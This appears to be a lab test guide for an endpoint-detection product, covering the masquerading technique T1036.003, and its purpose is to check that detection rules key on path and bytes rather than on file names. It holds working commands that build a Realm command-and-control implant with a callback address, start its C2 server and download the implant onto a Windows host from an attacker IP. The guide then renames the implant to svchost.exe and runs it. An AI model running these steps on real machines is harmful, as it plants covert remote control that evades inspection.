# Test: Evasion — masquerading as a system binary (T1036.003)

**Chain:** the implant renamed to `svchost.exe` (or lsass/csrss) in a user folder —
defeats name-based rules and analyst eyeballs. Tests that your detections key on **path
and bytes**, not the filename.

**Implant setup — creation to the Windows machine (do once before the test):**

**a) Kali, one-time tooling** (skip if already installed):
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y && source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
sudo apt update && sudo apt install -y golang git
```

**b) Kali — clone Realm, build the implant (callback baked in), start the C2:**
```bash
git clone https://github.com/spellshift/realm.git ~/realm && cd ~/realm
git checkout -b latest $(git tag | tail -1)
go run ./tavern                 # terminal 1: Tavern C2 server - leave running

cd ~/realm/implants/imix        # terminal 2: build with YOUR Kali IP baked in
IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release
mkdir -p ~/sideload-lab && cp target/release/imix.exe ~/sideload-lab/sysupd.exe
```

**c) Kali — serve the binaries:**
```bash
cd ~/sideload-lab && python3 -m http.server 8000
```

**d) Windows — put the implant on the machine + prep the EDR** (elevated PowerShell):
```powershell
Invoke-WebRequest http://172.16.69.109:8000/sysupd.exe -OutFile C:\Users\Public\sysupd.exe
# EDR running + fresh persistence baseline:
curl.exe -X POST http://127.0.0.1:8420/api/baseline
# console: http://127.0.0.1:8420 - alerts stream into the LIVE panel
```
These drops themselves should already fire `SIG-REALM-IMIX` / `SIG-RUST-IMPLANT`
(on-write scan) — delivery detection working before the test even starts.
Full reference: [`../_common/implant-build.md`](../_common/implant-build.md).


**Victim (elevated PowerShell):** `.\test.ps1`

```powershell
Copy-Item C:\Users\Public\sysupd.exe C:\Users\Public\svchost.exe
Start-Process C:\Users\Public\svchost.exe
```

**Expected alerts — nothing here is name-dependent:**

| Rule | Sev | Trigger |
|---|---|---|
| `EVT-4688-TEMP` | high | launch from a user-writable path (rename-blind) |
| `SIG-REALM-IMPLANT` etc. | crit/high | byte signatures (rename-blind) |
| `NET-BEACON` | critical | cadence analysis (peer-based, rename-blind) |
| `PROC-MASQ` | critical | system-binary *name* outside \Windows\ — names it explicitly |

**Judgment:** a miss on any of these = real detection bug. The masquerade must not evade
you; the test exists to prove your rules don't parse filenames into trust decisions.

**Cleanup:** global cleanup (kills only the Public-path svchost, never the system one).
